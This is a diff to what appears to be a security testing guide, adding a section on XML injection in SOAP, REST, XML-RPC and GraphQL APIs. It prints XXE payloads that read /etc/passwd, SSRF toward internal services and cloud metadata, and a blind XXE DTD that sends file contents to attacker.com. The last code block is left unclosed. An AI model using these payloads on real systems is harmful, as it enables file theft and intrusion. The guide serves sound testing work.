@@ -278,6 +278,125 @@ Other useful tests are the following:
         <!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
 ```
 
+### API-Specific XML Injection Testing
+
+Many APIs accept XML input or use XML-based protocols. These require specific testing approaches for XML injection vulnerabilities.
+
+#### SOAP API Testing
+
+SOAP APIs are inherently XML-based and are prime targets for XML injection:
+
+```http
+POST /api/soap/service HTTP/1.1
+Content-Type: text/xml
+SOAPAction: "urn:example:GetUser"
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <GetUser>
+      <UserId>&xxe;</UserId>
+    </GetUser>
+  </soap:Body>
+</soap:Envelope>
+```
+
+Test SOAP APIs for:
+- XXE in any user-supplied element values
+- DTD injection in the XML prolog
+- XPath injection in search parameters
+
+#### REST APIs with XML Content-Type
+
+REST APIs may accept XML as an alternative to JSON:
+
+```http
+POST /api/v1/users HTTP/1.1
+Content-Type: application/xml
+Accept: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<user>
+  <name>&xxe;</name>
+  <email>test@example.com</email>
+</user>
+```
+
+Test by:
+1. Checking if the API accepts `Content-Type: application/xml`
+2. Converting JSON payloads to XML equivalents
+3. Injecting XXE payloads in XML-accepting endpoints
+
+#### XML-RPC APIs
+
+XML-RPC uses XML for remote procedure calls:
+
+```http
+POST /xmlrpc HTTP/1.1
+Content-Type: text/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE methodCall [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<methodCall>
+  <methodName>system.listMethods</methodName>
+  <params>
+    <param><value>&xxe;</value></param>
+  </params>
+</methodCall>
+```
+
+#### GraphQL XML Injection
+
+While GraphQL uses JSON, some implementations may process XML in string fields:
+
+```graphql
+mutation {
+  createDocument(input: {
+    content: "<?xml version='1.0'?><!DOCTYPE d [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><d>&xxe;</d>"
+  }) {
+    id
+  }
+}
+```
+
+#### SSRF via XXE in APIs
+
+APIs are particularly vulnerable to SSRF through XXE attacks:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
+]>
+<request>&xxe;</request>
+```
+
+This can be used to:
+- Access internal services not exposed externally
+- Scan internal networks
+- Access cloud metadata services (`http://169.254.169.254/`)
+
+#### Blind XXE in APIs
+
+When APIs don't return inline data, use out-of-band techniques:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<data>test</data>
+```
+
+Where `evil.dtd` contains:
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
+%param;
+
 ### Tag Injection
 
 Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.
